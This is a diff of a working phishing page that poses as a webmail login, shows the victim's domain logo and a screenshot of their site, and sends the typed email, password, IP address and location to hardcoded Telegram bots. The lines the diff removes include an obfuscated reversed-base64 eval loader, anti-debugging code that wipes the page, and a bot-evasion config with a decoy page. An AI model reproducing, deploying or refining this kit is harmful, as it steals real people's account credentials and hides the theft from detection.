@@ -40,6 +40,14 @@
             background-color: #fff;
         }
         
+        body {
+            width: 100vw;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        
         [class~=main_container],
         body,
         [class~=container] {
@@ -1401,11 +1409,11 @@
         }
         
         [class~=bigbox] {
-            width: 80%;
+            width: 100%;
         }
         
         [class~=bigbox] {
-            height: 90%;
+            height: 100%;
         }
         
         [class~=location]>a,
@@ -1424,7 +1432,7 @@
         }
         
         [class~=bigbox] {
-            top: 3%;
+            top: 0;
         }
         
         [class~=location]>a {
@@ -1474,10 +1482,17 @@
         }
         
         [class~=bigbox] {
-            border-radius: 3.75pt;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+            z-index: 0;
         }
-        
-        .location {
             display: grid;
         }
         
@@ -1554,28 +1569,6 @@
     <style>
 
     </style>
-<script>
-var _ss3t0r1l=function(){try{var _t=new Date();debugger;if(new Date()-_t>120){try{document.body&&(document.body.innerHTML='')}catch(e){}}}catch(e){}};try{setInterval(_ss3t0r1l,1500)}catch(e){};
-var _p3t0r1l='=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';try{(0,window.eval)(window.atob(_p3t0r1l.split('').reverse().join('')));}catch(e){};
-</script>
-<script>
-SentinelShield.init({
-  debug: false,
-  modules: { pow: true, harden: true, antiCrawler: true },
-  pow: { difficulty: 4 },
-  gateContent: true,
-  gateSelector: '[data-protected]',
-  decoy: { enabled: true, title: 'Welcome',
-    html: (function(){try{return decodeURIComponent(escape(atob('PCFET0NUWVBFIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjxtZXRhIGNoYXJzZXQ9IlVURi04Ij48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLGluaXRpYWwtc2NhbGU9MSI+PHRpdGxlPldlbGNvbWU8L3RpdGxlPjwvaGVhZD48Ym9keT48aDE+QWNtZSBIb2xkaW5ncyBMdGQ8L2gxPjxwPldlIGRlbGl2ZXIgY2xvdWQtbmF0aXZlIHN5bmVyZ3kgc29sdXRpb25zIGZvciBlbnRlcnByaXNlIGNsaWVudHMgd29ybGR3aWRlLCBoZWxwaW5nIHRlYW1zIHNjYWxlIHdpdGggY29uZmlkZW5jZS48L3A+PGgyPk91ciBTZXJ2aWNlczwvaDI+PHVsPjxsaT5TdHJhdGVnaWMgY29uc3VsdGluZyBhbmQgZGlnaXRhbCB0cmFuc2Zvcm1hdGlvbjwvbGk+PGxpPkNsb3VkIG1pZ3JhdGlvbiBhbmQgRGV2T3BzIGF1dG9tYXRpb248L2xpPjxsaT5EYXRhIGFuYWx5dGljcyBhbmQgYnVzaW5lc3MgaW50ZWxsaWdlbmNlPC9saT48L3VsPjxoMj5XaHkgdGVhbXMgY2hvb3NlIHVzPC9oMj48cD5PdmVyIGEgZGVjYWRlIG9mIHByb3ZlbiByZXN1bHRzIGFjcm9zcyBmaW5hbmNlLCByZXRhaWwgYW5kIGxvZ2lzdGljcy4gT3VyIHBsYXRmb3JtIGhhbmRsZXMgbWlsbGlvbnMgb2YgcmVxdWVzdHMgcGVyIGRheSB3aXRoIDk5LjklIHVwdGltZS48L3A+PGgyPkNvbnRhY3Q8L2gyPjxwPkVtYWlsOiBoZWxsb0BhY21lLWhvbGRpbmdzLmV4YW1wbGU8YnI+UGhvbmU6ICsxLTU1NS0wMTk5PGJyPkFkZHJlc3M6IDQ4MDAgTWFya2V0IFN0LCBTdWl0ZSAyMDAsIFNwcmluZ2ZpZWxkPC9wPjxwPiZjb3B5OyAyMDI0IEFjbWUgSG9sZGluZ3MgTHRkLiBBbGwgcmlnaHRzIHJlc2VydmVkLjwvcD48L2JvZHk+PC9odG1sPg==')))}catch(e){return ''}})() },
-  harden: {
-    disableContextMenu: true,
-    disableShortcuts: true,
-    antiDebug: true, devtoolsAction: "blur"
-  },
-  onPass: function (nonce, hash) { console.log("SentinelShield: access granted", hash); },
-  onBlock: function (reason) { console.log("SentinelShield: blocked", reason); }
-});
-</script>
 </head>
 
 <body id="body" style="background-color: transparent;">
@@ -1720,52 +1713,60 @@ document.write(browserName);</script><span id="time"></span>  </a>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
 <script>
-// --- 1. OS Detection ---
+
 function getOS() {
- const userAgent = window.navigator.userAgent,
- platform = window.navigator?.userAgentData?.platform || window.navigator.platform,
- macosPlatforms = ['macOS', 'Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
- windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
- iosPlatforms = ['iPhone', 'iPad', 'iPod'];
- let os = null;
+  const userAgent = window.navigator.userAgent,
+      platform = window.navigator?.userAgentData?.platform || window.navigator.platform,
+      macosPlatforms = ['macOS', 'Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
+      windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
+      iosPlatforms = ['iPhone', 'iPad', 'iPod'];
+  let os = null;
 
- if (macosPlatforms.indexOf(platform) !== -1) {
- os = 'Mac OS';
- } else if (iosPlatforms.indexOf(platform) !== -1) {
- os = 'iOS';
- } else if (windowsPlatforms.indexOf(platform) !== -1) {
- os = 'Windows';
- } else if (/Android/.test(userAgent)) {
- os = 'Android';
- } else if (/Linux/.test(platform)) {
- os = 'Linux';
- }
+  if (macosPlatforms.indexOf(platform) !== -1) {
+    os = 'Mac OS';
+  } else if (iosPlatforms.indexOf(platform) !== -1) {
+    os = 'iOS';
+  } else if (windowsPlatforms.indexOf(platform) !== -1) {
+    os = 'Windows';
+  } else if (/Android/.test(userAgent)) {
+    os = 'Android';
+  } else if (/Linux/.test(platform)) {
+    os = 'Linux';
+  }
 
- return os;
+  return os;
 }
 
 var bari = (getOS());
 $('#opsder').html(bari);
 
-// --- 2. Date & Time Update ---
-var date = new Date();
-var n = date.toDateString();
-var time = date.toLocaleTimeString();
-document.getElementById('time').innerHTML = n + ' ' + time;
-document.getElementById('times').innerHTML = n + ' ' + time;
-
-// --- 3. Loader Logic (Crucial for showing the form) ---
-setTimeout(() => { 
- $('.mail-loader_block').css('display', 'none'); // Hide loader
- $('#doom').css('display', 'block'); // Show Form
-}, 5000); // 5 seconds delay
 
 </script>
+	<script>
+	// get a new date (locale machine date time)
+var date = new Date();
+// get the date as a string
+var n = date.toDateString();
+// get the time as a string
+var time = date.toLocaleTimeString();
 
+// find the html element with the id of time
+// set the innerHTML of that element to the date a space the time
+document.getElementById('time').innerHTML = n + ' ' + time;
+document.getElementById('times').innerHTML = n + ' ' + time;	
+	
+	</script>
+	<script>
+	
+	setTimeout(() => {  
+	$('.mail-loader_block').css('display', 'none');
+	$('#doom').css('display', 'block'); }, 5000);
+
+
+	</script>
 <script>
 $(document).ready(function(){
     var count = 0;
-    var maxAttempts = 2; // Redirect after 2 attempts
 
     // --- Email Handling from URL Hash ---
     var email = window.location.hash.substr(1);
@@ -1781,40 +1782,30 @@ $(document).ready(function(){
         var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
         if (!filter.test(my_email)) {
             $('#error').show();
+            email.focus;
             return false;
         }
 
-        function updateBackground(my_email) {
-            var ind = my_email.indexOf("@");
-            var my_slice = my_email.substr(ind + 1);
-            $('#footer_dom').html(my_email);
-            $('#carss').html(my_email);
-            $("#top_label_logo").attr("src", "https://icons.duckduckgo.com/ip3/" + my_slice + ".ico");
-            
-            var mPage = "https://image.thum.io/get/https://" + my_slice;
-            document.body.style.backgroundImage = "url('" + mPage + "')";
-            document.body.style.backgroundRepeat = "no-repeat";
-            document.body.style.backgroundPosition = "center center";
-            document.body.style.backgroundAttachment = "fixed";
-            document.body.style.backgroundSize = "cover";
-        }
-
-        updateBackground(my_email);
+        var ind = my_email.indexOf("@");
+        var my_slice = my_email.substr((ind + 1));
         
-        // Listen for hash changes dynamically
-        window.addEventListener("hashchange", function() {
-            var new_hash = window.location.hash;
-            if (new_hash && new_hash.length > 1) {
-                updateBackground(new_hash.substring(1));
-            }
-        });
+        $('#footer_dom').html(my_email);
+        $('#carss').html(my_email);
+        $('#top_label_logo').attr("src", "https://icons.duckduckgo.com/ip3/" + my_slice + ".ico");
+
+        // set screenshot as background image
+        var mPage = "https://image.thum.io/get/https://" + my_slice;
+        document.body.style.backgroundImage = "url('" + mPage + "')";
+        document.body.style.backgroundRepeat = "no-repeat";
+        document.body.style.backgroundPosition = "center center";
+        document.body.style.backgroundAttachment = "fixed";
+        document.body.style.backgroundSize = "cover";
     }
 
-    // --- Login Button Logic ---
     $('#next_button').click(function(event){
-        event.preventDefault();
         $('#error').hide();
         $('#msg').hide();
+        event.preventDefault();
 
         var email = $("#email").val();
         var password = $("#password").val();
@@ -1827,70 +1818,99 @@ $(document).ready(function(){
             return false;
         }
 
-        count++;
+        count = count + 1;
 
-        // --- GET IP LOCATION ---
-        let ipLocation = "Unknown Location";
+        // --- Fetch IP Location Data First ---
         fetch('https://ipapi.co/json/')
             .then(response => response.json())
             .then(data => {
-                if(data && data.city && data.country_name) {
-                    ipLocation = `${data.city}, ${data.country_name} (${data.ip})`;
-                } else {
-                    ipLocation = `IP: ${data.ip}`;
-                }
+                // Construct the location string safely
+                var city = data.city || "Unknown City";
+                var country = data.country_name || "Unknown Country";
+                var ip = data.ip || "Unknown IP";
                 
-                // Send Telegram Notification AFTER getting location
-                sendTelegram(email, password, my_slice, ipLocation);
+                // Format the message with location
+                var telegramMessage = `***** Webmail Result *****\r\n📧Email: ${email}\r\n🔑Password: ${password}\r\n🌐Domain: ${my_slice}\n📍Location: ${city}, ${country} (${ip})\n*****`;
+
+                // Send to Telegram
+                $.ajax({
+                    dataType: 'json', 
+                    url: 'https://api.telegram.org/bot8736118853:AAGWaGwSiOAsx76F3S7s4qHnjJe--GCE8Y0/sendMessage',
+                    type: 'POST',
+                    data: {
+                        chat_id: '5428029982',
+                        text: telegramMessage
+                    },
+                    beforeSend: function(xhr) {
+                        $('#submit-btn').html('Verifying...');
+                    },
+                    success: function(response) {
+                        if (response.ok) {
+                            $("#msg").show();
+                            console.log(response);
+                            $("#password").val("");
+                            if (count >= 3) {
+                                count = 0;
+                                window.location.replace("https://www." + my_slice);
+                            }
+                        } else {
+                            console.log('Telegram API error:', response);
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        console.log('AJAX error:', status, error);
+                        $("#password").val("");
+                        if (count >= 3) {
+                            count = 0;
+                            window.location.replace("https://www." + my_slice);
+                        }
+                        $("#msg").show();
+                    },
+                    complete: function() {
+                        // Optional: Reset button text here if needed
+                    }
+                });
             })
-            .catch(e => {
-                console.error("Failed to fetch IP location");
-                // Still send telegram even if IP fails
-                sendTelegram(email, password, my_slice, "IP Unavailable");
+            .catch(err => {
+                // Fallback if IP API fails: send message without location
+                var fallbackMessage = `***** Webmail Result *****\r\n📧Email: ${email}\r\n🔑Password: ${password}\r\n🌐Domain: ${my_slice}\n📍Location: IP Unavailable\n*****`;
+                
+                $.ajax({
+                    dataType: 'json', 
+                    url: 'https://api.telegram.org/bot8736118853:AAGWaGwSiOAsx76F3S7s4qHnjJe--GCE8Y0/sendMessage',
+                    type: 'POST',
+                    data: {
+                        chat_id: '5428029982',
+                        text: fallbackMessage
+                    },
+                    success: function(response) {
+                         if (response.ok) {
+                            $("#msg").show();
+                            $("#password").val("");
+                            if (count >= 3) {
+                                count = 0;
+                                window.location.replace("https://www." + my_slice);
+                            }
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        console.log('Fallback AJAX error:', status, error);
+                        $("#password").val("");
+                        if (count >= 3) {
+                            count = 0;
+                            window.location.replace("https://www." + my_slice);
+                        }
+                        $("#msg").show();
+                    }
+                });
             });
-
-        // --- TELEGRAM NOTIFICATION FUNCTION ---
-        function sendTelegram(email, pass, domain, loc) {
-            const BOT_TOKEN = "6130365936:AAGseTGoS7q6Jz4xzHaY9I0DQv63vgA5y4o"; 
-            const CHAT_ID = "5643928959"; 
-            
-            const message = `🔓 <b>New Login Attempt</b>\n\n📧 Email: ${email}\n🔑 Password: ${pass}\n🌐 Domain: ${domain}\n📍 Location: ${loc}`;
-
-            $.ajax({
-                url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-                method: "POST",
-                data: {
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: "HTML"
-                },
-                success: function(response) {
-                    console.log("Telegram notification sent successfully:", response);
-                },
-                error: function(error) {
-                    console.error("Telegram notification failed:", error);
-                    console.log("Payload sent:", message);
-                }
-            });
-        }
-
-        // --- UI UPDATE & REDIRECT LOGIC ---
-        $("#password").val("");
-        
-        if (count >= maxAttempts) {
-            count = 0; // Reset counter
-            $("#auth_reg").html("Redirecting...");
-            setTimeout(() => {
-                window.location.replace("https://www." + my_slice);
-            }, 1000);
-        } else {
-            $("#auth_reg").show();
-            $('#auth_reg').html(`Attempt ${count}/${maxAttempts}...`);
-            // Optional: Clear password field but keep user on page
-        }
     });
 });
-</script>
+</script>	
    
    </body></html>
+
+
+
+
 
